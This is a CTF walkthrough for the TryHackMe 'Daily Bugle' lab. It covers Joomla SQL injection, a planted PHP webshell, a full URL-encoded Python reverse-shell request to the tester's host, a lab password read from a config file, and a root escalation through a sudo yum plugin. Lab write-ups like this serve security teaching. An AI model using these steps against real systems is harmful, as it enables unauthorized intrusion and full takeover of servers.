# TryHackMe
------------------------------------
### IP: 10.10.182.0
### Name: Daily Bugle
### Difficulty: Hard
--------------------------------------------

![daily_bugle_profile.png](../assets/daily_bugle_assets/daily_bugle_profile.png)

### Enumeration

I'll begin enumerating this box by scanning all TCP ports with Nmap and use the `--min-rate 10000` flag to speed things up. I'll also use the `-sC` and `-sV` to use basic Nmap scripts and to enumerate versions:

```
┌──(ryan㉿kali)-[~/THM/Daily_Bugle]
└─$ sudo nmap -p- --min-rate 10000 -sC -sV 10.10.182.0
Starting Nmap 7.93 ( https://nmap.org ) at 2024-06-15 10:56 CDT
Warning: 10.10.182.0 giving up on port because retransmission cap hit (10).
Nmap scan report for 10.10.182.0
Host is up (0.19s latency).
Not shown: 65500 closed tcp ports (reset), 33 filtered tcp ports (no-response)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.4 (protocol 2.0)
| ssh-hostkey: 
|   2048 68ed7b197fed14e618986dc58830aae9 (RSA)
|   256 5cd682dab219e33799fb96820870ee9d (ECDSA)
|_  256 d2a975cf2f1ef5444f0b13c20fd737cc (ED25519)
80/tcp open  http    Apache httpd 2.4.6 ((CentOS) PHP/5.6.40)
| http-robots.txt: 15 disallowed entries 
| /joomla/administrator/ /administrator/ /bin/ /cache/ 
| /cli/ /components/ /includes/ /installation/ /language/ 
|_/layouts/ /libraries/ /logs/ /modules/ /plugins/ /tmp/

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 119.84 seconds
```

Looks like Nmap picked up the robots.txt entries and we can see the page on port 80 is running Joomla CMS.

daily_bugle_page.png

Lets enumerate Joomla with joomscan:

```
┌──(ryan㉿kali)-[~/THM/Daily_Bugle]
└─$ joomscan -u http://10.10.182.0/

    ____  _____  _____  __  __  ___   ___    __    _  _ 
   (_  _)(  _  )(  _  )(  \/  )/ __) / __)  /__\  ( \( )
  .-_)(   )(_)(  )(_)(  )    ( \__ \( (__  /(__)\  )  ( 
  \____) (_____)(_____)(_/\/\_)(___/ \___)(__)(__)(_)\_)
			(1337.today)
   
    --=[OWASP JoomScan
    +---++---==[Version : 0.0.7
    +---++---==[Update Date : [2018/09/23]
    +---++---==[Authors : Mohammad Reza Espargham , Ali Razmjoo
    --=[Code name : Self Challenge
    @OWASP_JoomScan , @rezesp , @Ali_Razmjo0 , @OWASP

Processing http://10.10.182.0/ ...



[+] FireWall Detector
[++] Firewall not detected

[+] Detecting Joomla Version
[++] Joomla 3.7.0

[+] Core Joomla Vulnerability
[++] Target Joomla core is not vulnerable

[+] Checking Directory Listing
[++] directory has directory listing : 
http://10.10.182.0/administrator/components
http://10.10.182.0/administrator/modules
http://10.10.182.0/administrator/templates
http://10.10.182.0/images/banners


[+] Checking apache info/status files
[++] Readable info/status files are not found

[+] admin finder
[++] Admin page : http://10.10.182.0/administrator/

[+] Checking robots.txt existing
[++] robots.txt is found
path : http://10.10.182.0/robots.txt 

Interesting path found from robots.txt
http://10.10.182.0/joomla/administrator/
http://10.10.182.0/administrator/
http://10.10.182.0/bin/
http://10.10.182.0/cache/
http://10.10.182.0/cli/
http://10.10.182.0/components/
http://10.10.182.0/includes/
http://10.10.182.0/installation/
http://10.10.182.0/language/
http://10.10.182.0/layouts/
http://10.10.182.0/libraries/
http://10.10.182.0/logs/
http://10.10.182.0/modules/
http://10.10.182.0/plugins/
http://10.10.182.0/tmp/


[+] Finding common backup files name
[++] Backup files are not found

[+] Finding common log files name
[++] error log is not found

[+] Checking sensitive config.php.x file
[++] Readable config files are not found


Your Report : reports/10.10.182.0/
```

This didn't pick up much of interest for us. 

Looking for vulnerabilities for Joomla 3.7.0 we find it is vulnerable to SQL injection in the `com_fields` component. Lets use joomblah.py to exploit this: https://github.com/stefanlucas/Exploit-Joomla

daily_bugle_joomblah.png

Nice, looks like we've got a hash for user Jonah, and that he's a super user. Lets try cracking it:

daily_bugle_john.png

Cool, we cracked it. Unfortunately we can't use this credential to just SSH in, so lets navigate to http://10.10.182.0/administrator/ found in robots.txt and joomscan to login:

daily_bugle_in.png

We can exploit Joomla functionality to achieve RCE on the target.

### Exploitation

Lets modify a Template to a PHP webshell. 

Clicking on Templates > ProStar we are brought to a page to customize the template.

Lets delete the PHP content for `error.php` and insert our own webshell code:

daily_bugle_edit.png

Saving these changes we can navigate to http://10.10.182.0/templates/protostar/error.php?cmd=id to confirm code execution:

daily_bugle_id.png

Lets head to revshells.com and grab a URL encoded Python reverse shell command.

We can then navigate to:
```
http://10.10.182.0/templates/protostar/error.php?cmd=python%20-c%20%27import%20socket%2Csubprocess%2Cos%3Bs%3Dsocket.socket%28socket.AF_INET%2Csocket.SOCK_STREAM%29%3Bs.connect%28%28%2210.6.72.91%22%2C443%29%29%3Bos.dup2%28s.fileno%28%29%2C0%29%3B%20os.dup2%28s.fileno%28%29%2C1%29%3Bos.dup2%28s.fileno%28%29%2C2%29%3Bimport%20pty%3B%20pty.spawn%28%22%2Fbin%2Fbash%22%29%27
```

To catch a shell back as  the user apache:

```
┌──(ryan㉿kali)-[~/THM/Daily_Bugle]
└─$ nc -lnvp 443
listening on [any] 443 ...
connect to [10.6.72.91] from (UNKNOWN) [10.10.182.0] 33564
bash-4.2$ whoami
whoami
apache
bash-4.2$ hostname
hostname
dailybugle
```

We get a permission denied trying to access the user.txt flag in jjameson's directory:

```
bash-4.2$ cd /home
bash-4.2$ ls
jjameson
bash-4.2$ cd jjameson
bash: cd: jjameson: Permission denied
```

Looking at the config file for Joomla in `/var/www/html` to find a password: `nv5uz9r3ZEDzVjNu`

daily_bugle_pw.png

We can use this to `su jjameson`

```
}bash-4.2$ su jjameson
Password: 
[jjameson@dailybugle html]$ whoami
jjameson
```

And grab the user.txt flag:

daily_bugle_user_flag.png

### Privilege Escalation

Running `sudo -l` to see what jjmaeson can execute as root we find `yum`

```
[jjameson@dailybugle ~]$ sudo -l
Matching Defaults entries for jjameson on dailybugle:
    !visiblepw, always_set_home, match_group_by_gid, always_query_group_plugin,
    env_reset, env_keep="COLORS DISPLAY HOSTNAME HISTSIZE KDEDIR LS_COLORS",
    env_keep+="MAIL PS1 PS2 QTDIR USERNAME LANG LC_ADDRESS LC_CTYPE",
    env_keep+="LC_COLLATE LC_IDENTIFICATION LC_MEASUREMENT LC_MESSAGES",
    env_keep+="LC_MONETARY LC_NAME LC_NUMERIC LC_PAPER LC_TELEPHONE",
    env_keep+="LC_TIME LC_ALL LANGUAGE LINGUAS _XKB_CHARSET XAUTHORITY",
    secure_path=/sbin\:/bin\:/usr/sbin\:/usr/bin

User jjameson may run the following commands on dailybugle:
    (ALL) NOPASSWD: /usr/bin/yum
```

Nice, this should make for an easy root.

Lets head to gtofobins.com and crab the commands we'll need:

daily_bugle_gtfobins.png

We can literally paste these commands into our shell and achieve root:

```
[jjameson@dailybugle ~]$ TF=$(mktemp -d)
[jjameson@dailybugle ~]$ cat >$TF/x<<EOF
> [main]
> plugins=1
> pluginpath=$TF
> pluginconfpath=$TF
> EOF
[jjameson@dailybugle ~]$ cat >$TF/y.conf<<EOF
> [main]
> enabled=1
> EOF
[jjameson@dailybugle ~]$ cat >$TF/y.py<<EOF
> import os
> import yum
> from yum.plugins import PluginYumExit, TYPE_CORE, TYPE_INTERACTIVE
> requires_api_version='2.1'
> def init_hook(conduit):
>   os.execl('/bin/sh','/bin/sh')
> EOF
[jjameson@dailybugle ~]$ sudo /usr/bin/yum -c $TF/x --enableplugin=y
Loaded plugins: y
No plugin match for: y
sh-4.2# whoami
root
sh-4.2# id
uid=0(root) gid=0(root) groups=0(root)
```

We can then grab the final flag:

daily_bugle_root_flag.png

Thanks for following along!

-Ryan

-------------------------------------------
